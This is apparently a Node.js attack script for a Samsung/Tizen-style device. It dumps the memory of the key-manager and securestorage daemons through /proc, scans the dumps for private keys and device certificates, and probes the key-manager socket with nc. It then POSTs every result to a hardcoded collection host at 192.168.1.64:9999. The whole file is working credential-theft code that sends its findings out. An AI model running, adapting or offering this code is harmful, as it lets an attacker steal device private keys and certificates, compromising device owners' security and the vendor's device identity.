"use strict";
// audit97.js - dump key-manager daemon memory + scan for PEM/DER key material.
// Also try CKM storage socket. The key-manager decrypts keys in RAM.
var fs = require("fs");
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
function trim(s) { return (s || "").trim(); }

var out = {};
out.started = new Date().toISOString();

// find key-manager pid
out.km_pidof = sh("pidof key-manager", 200);
var kmPid = trim(out.km_pidof).match(/^(\d+)/);
kmPid = kmPid ? kmPid[1] : null;
out.km_pid = kmPid;

// also find securestorage pid
out.ss_pidof = sh("pidof securestorage-s", 200);
var ssPid = trim(out.ss_pidof).match(/^(\d+)/);
ssPid = ssPid ? ssPid[1] : null;
out.ss_pid = ssPid;

// dump key-manager rw memory and scan
if (kmPid) {
    out.km_dump = sh("cat /proc/" + kmPid + "/maps | awk '$2 ~ /^rw/ {split($1,a,\"-\"); print a[1], a[2]}' > /tmp/.kmmap; > /tmp/km_mem.bin; while read s e; do ss=$(printf '%d' 0x$s); es=$(printf '%d' 0x$e); sz=$((es-ss)); dd if=/proc/" + kmPid + "/mem bs=4096 skip=$((ss/4096)) count=$(((sz+4095)/4096)) 2>/dev/null | head -c $sz >> /tmp/km_mem.bin; done < /tmp/.kmmap; ls -la /tmp/km_mem.bin", 1500);
    out.km_pem = sh("grep -aob -e 'BEGIN RSA PRIVATE' -e 'BEGIN PRIVATE' -e 'BEGIN ENCRYPTED' -e 'BEGIN EC PRIVATE' -e 'BEGIN RSA PUBLIC' /tmp/km_mem.bin | head -20", 2500);
    out.km_der = sh("grep -aob 'SamsungDeviceCertificate' /tmp/km_mem.bin | head -10", 1500);
    out.km_strings = sh("strings /tmp/km_mem.bin 2>/dev/null | grep -iE 'private|BEGIN|certificate|acr|device.?cert' | head -25", 3000);
}

// dump securestorage-s memory and scan
if (ssPid) {
    out.ss_dump = sh("cat /proc/" + ssPid + "/maps | awk '$2 ~ /^rw/ {split($1,a,\"-\"); print a[1], a[2]}' > /tmp/.ssmap; > /tmp/ss_mem.bin; while read s e; do ss=$(printf '%d' 0x$s); es=$(printf '%d' 0x$e); sz=$((es-ss)); dd if=/proc/" + ssPid + "/mem bs=4096 skip=$((ss/4096)) count=$(((sz+4095)/4096)) 2>/dev/null | head -c $sz >> /tmp/ss_mem.bin; done < /tmp/.ssmap; ls -la /tmp/ss_mem.bin", 1500);
    out.ss_pem = sh("grep -aob -e 'BEGIN RSA PRIVATE' -e 'BEGIN PRIVATE' -e 'BEGIN ENCRYPTED' /tmp/ss_mem.bin | head -20", 2500);
    out.ss_strings = sh("strings /tmp/ss_mem.bin 2>/dev/null | grep -iE 'private|BEGIN|certificate|acr|device' | head -25", 3000);
}

// try CKM storage socket - send a list/get request
out.sock_test = sh("ls -la /tmp/.central-key-manager-api-storage.sock; echo '---'; timeout 3 sh -c 'echo \"test\" | nc -U /tmp/.central-key-manager-api-storage.sock' 2>&1 | head -5", 1500);

post("/p97_km_scan", out);
post("/p97_done", { started: out.started });
